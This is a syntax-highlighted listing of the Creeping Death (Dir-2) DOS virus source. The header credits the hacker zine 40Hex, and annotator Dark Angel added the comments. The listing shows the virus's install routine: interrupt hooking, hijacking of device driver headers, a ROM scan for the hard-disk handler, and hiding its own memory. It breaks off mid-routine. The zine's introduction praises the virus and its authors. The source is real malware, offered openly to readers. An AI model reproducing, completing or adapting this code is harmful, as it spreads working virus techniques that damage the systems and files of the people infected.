<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>creaping_death.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; 40Hex Number 6 Volume 2 Issue 2                                      File 00A</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      Welcome to this issue's VIRUS SPOTLITE, the infamous Creeping Death(dir2).</span><span class="sc0">
</span><span class="sc1">; This is one of the most impressive viruses out there, and VirusSoft looks to be</span><span class="sc0">
</span><span class="sc1">; a promising group in the future.  Unfortunately, the source code we obtained</span><span class="sc0">
</span><span class="sc1">; had almost no comments.  Dark Angel commented it as best as he possibly could,</span><span class="sc0">
</span><span class="sc1">; but I think it is safe to say that there may be a few discrepancies.</span><span class="sc0">
</span><span class="sc1">; Nonetheless, it was an excellent job, kudos to DA.  Although I am writing this</span><span class="sc0">
</span><span class="sc1">; header, I had nothing to do with the commenting, so Dark Angel gets all the</span><span class="sc0">
</span><span class="sc1">; credit.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                                 -)GHeap</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; -------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Dark Angel's comments: I spent my entire waking hours looking at this virus.</span><span class="sc0">
</span><span class="sc1">;                        I love it.  It is my life.  I worship the drive it</span><span class="sc0">
</span><span class="sc1">;                        infects.  Take a look at it.  Let not my troubles be</span><span class="sc0">
</span><span class="sc1">;                        in vain.  Why did I do this?  I sacrifice my life for</span><span class="sc0">
</span><span class="sc1">;                        the benefit of 40Hex.  If you don't read this, I'm</span><span class="sc0">
</span><span class="sc1">;                        gonna go join [NuKE].</span><span class="sc0">

</span><span class="sc1">;        Creeping Death  V 1.0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        (C) Copyright 1991 by VirusSoft Corp.</span><span class="sc0">

</span><span class="sc5">i13org</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">    </span><span class="sc2">5f8h</span><span class="sc0">
</span><span class="sc5">i21org</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">    </span><span class="sc2">5fch</span><span class="sc0">

</span><span class="sc5">dir_2</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">dir_2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">dir_2</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0">   </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc0">                          </span><span class="sc1">; Set up the stack pointer</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">counter</span><span class="sc0">                 </span><span class="sc1">; Generation counter</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                            </span><span class="sc1">; DS points to interrupt table</span><span class="sc0">
         </span><span class="sc6">lds</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0c1h</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; Find interrupt 30h</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">                           </span><span class="sc1">; Change it to Int 21h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">                               </span><span class="sc1">; Save it on stack for use by</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; subroutine "jump"</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                           </span><span class="sc1">; Get DOS version</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">jump</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                             </span><span class="sc1">; DOS 4.X+ : SI = 0</span><span class="sc0">
         </span><span class="sc6">sbb</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                            </span><span class="sc1">; DOS 2/3  : SI = -1</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">drive</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Initialise last drive to</span><span class="sc0">
                                                </span><span class="sc1">; "never accessed"</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">                           </span><span class="sc1">; Adjust memory in ES to</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">                           </span><span class="sc1">; BX paragraphs.</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">jump</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">                           </span><span class="sc1">; Get DOS List of Lists</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">jump</span><span class="sc0">                             </span><span class="sc1">; to ES:BX</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; Save Segment of first MCB</span><span class="sc0">
         </span><span class="sc6">lds</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; DS:BX -&gt; 1st DPB</span><span class="sc0">
                                                </span><span class="sc1">;  (Drive parameter block)</span><span class="sc0">
</span><span class="sc5">search</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Get segment of device driver</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">                           </span><span class="sc1">; Is it CONFIG? (I think)</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">next</span><span class="sc0">                             </span><span class="sc1">; If not, try again</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                            </span><span class="sc1">; Move driver segment to CX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; Flag block must be rebuilt</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Save offset of device driver</span><span class="sc0">
                                                </span><span class="sc1">; Original device driver</span><span class="sc0">
                                                </span><span class="sc1">; address in CX:DI</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0">        </span><span class="sc1">; Replace with our own</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">                   </span><span class="sc1">;  (header)</span><span class="sc0">
</span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lds</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">19h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Get next device block</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">; Is it the last one?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">search</span><span class="sc0">                           </span><span class="sc1">; If not, search it</span><span class="sc0">
         </span><span class="sc6">jcxz</span><span class="sc0">  </span><span class="sc5">install</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">                               </span><span class="sc1">; Restore segment of first</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                            </span><span class="sc1">; MCB</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; Go to next MCB</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; AX = segment next MCB</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                            </span><span class="sc1">; DX = MCB owning current</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">                               </span><span class="sc1">;      program</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                            </span><span class="sc1">; Are these the same?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">no_boot</span><span class="sc0">                          </span><span class="sc1">; If not, we are not currently</span><span class="sc0">
                                                </span><span class="sc1">; in the middle of a reboot</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">61h</span><span class="sc0">              </span><span class="sc1">; Increase length owned by</span><span class="sc0">
                                                </span><span class="sc1">; MCB by 1552 bytes</span><span class="sc0">
</span><span class="sc5">no_boot</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                            </span><span class="sc1">; DS = MCB owning current</span><span class="sc0">
                                                </span><span class="sc1">; program</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">                </span><span class="sc1">; Set owner = DOS</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                            </span><span class="sc1">; DS = segment of original</span><span class="sc0">
                                                </span><span class="sc1">;      device driver</span><span class="sc0">
         </span><span class="sc6">les</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; ES = offset int handler</span><span class="sc0">
                                                </span><span class="sc1">; AX = offset strategy entry</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">str_block</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; Save entry point</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">int_block</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">         </span><span class="sc1">; And int block for use in</span><span class="sc0">
                                                </span><span class="sc1">; function _in</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">                                    </span><span class="sc1">; Scan for the write</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                             </span><span class="sc1">; function in the</span><span class="sc0">
</span><span class="sc5">scan</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">dec</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">                               </span><span class="sc1">; original device driver</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1effh</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">scan</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2cah</span><span class="sc0">                          </span><span class="sc1">; Wicked un-yar place o'</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                        </span><span class="sc1">; doom.</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">right</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">scan</span><span class="sc0">
</span><span class="sc5">right</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsw</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">modify</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; Save address of patch</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">                                  </span><span class="sc1">; area so it can be changed</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                            </span><span class="sc1">; later.</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i13org</span><span class="sc0">                 </span><span class="sc1">; This is in the stack, but</span><span class="sc0">
         </span><span class="sc6">cli</span><span class="sc0">                                    </span><span class="sc1">; it is used by "i13pr"</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0c000h</span><span class="sc0">                        </span><span class="sc1">; Scan for hard disk ROM</span><span class="sc0">
                                                </span><span class="sc1">; Start search @ segment C000h</span><span class="sc0">
</span><span class="sc5">fdsk1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                            </span><span class="sc1">; Load up the segment</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                            </span><span class="sc1">; atart at offset 0000h</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">                                  </span><span class="sc1">; Scan for the signature</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0aa55h</span><span class="sc0">                        </span><span class="sc1">; Is it the signature?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">fdsk4</span><span class="sc0">                            </span><span class="sc1">; If not, change segment</span><span class="sc0">
         </span><span class="sc6">cbw</span><span class="sc0">                                    </span><span class="sc1">; clear AH</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">                                  </span><span class="sc1">; load a byte to AL</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
         </span><span class="sc6">sal</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                            </span><span class="sc1">; Shift left, 0 filled</span><span class="sc0">
</span><span class="sc5">fdsk2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">6c7h</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">fdsk3</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">4ch</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">fdsk3</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">                               </span><span class="sc1">; Save the segment</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">; and offset on stack</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">death</span><span class="sc0">                      </span><span class="sc1">; for use by i13pr</span><span class="sc0">

</span><span class="sc5">install</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">file</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc3">"c:"</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fdsk3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">                               </span><span class="sc1">; Increment search offset</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                            </span><span class="sc1">; If we are not too high,</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">fdsk2</span><span class="sc0">                            </span><span class="sc1">; try again</span><span class="sc0">
</span><span class="sc5">fdsk4</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">                               </span><span class="sc1">; Increment search segment</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc0">                          </span><span class="sc1">; If we are not in high</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">fdsk1</span><span class="sc0">                            </span><span class="sc1">; memory, try again</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                             </span><span class="sc1">; effectively push dummy vars.</span><span class="sc0">
</span><span class="sc5">death</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc0">                               </span><span class="sc1">; on stack for use by i13pr</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; Get environment from PSP</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">                           </span><span class="sc1">; Release it (to save memory)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">jump</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                            </span><span class="sc1">; Is BX = 0?</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">boot</span><span class="sc0">                             </span><span class="sc1">; If so, we are booting now</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                             </span><span class="sc1">; and not running a file</span><span class="sc0">
</span><span class="sc5">seek</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">dec</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">                               </span><span class="sc1">; Search for end of</span><span class="sc0">
         </span><span class="sc6">scasw</span><span class="sc0">                                  </span><span class="sc1">; the environment block</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">seek</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; SI points to filename</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">exec</span><span class="sc0">                       </span><span class="sc1">; (in DOS 3.X+)</span><span class="sc0">
                                                </span><span class="sc1">; Execute that file</span><span class="sc0">
</span><span class="sc5">boot</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; get PSP of parent</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; get PSP of parent</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0">                               </span><span class="sc1">; go to its MCB</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">exec</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">param</span><span class="sc0">                  </span><span class="sc1">; Set up parameter block</span><span class="sc0">
                                                </span><span class="sc1">; for EXEC function</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">                        </span><span class="sc1">; segment to command line</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">                        </span><span class="sc1">; segment to 1st FCB</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">                       </span><span class="sc1">; segment to 2nd FCB</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">f_name</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">                               </span><span class="sc1">; Save filename offset</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                            </span><span class="sc1">; Copy the filename to</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">   </span><span class="sc6">movsw</span><span class="sc0">                            </span><span class="sc1">; the buffer</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">                           </span><span class="sc1">; Handle open file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc0">                   </span><span class="sc1">; "c:ÿ",0</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">jump</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">                               </span><span class="sc1">; DS:DX -&gt; filename</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">                         </span><span class="sc1">; Load and Execute</span><span class="sc0">
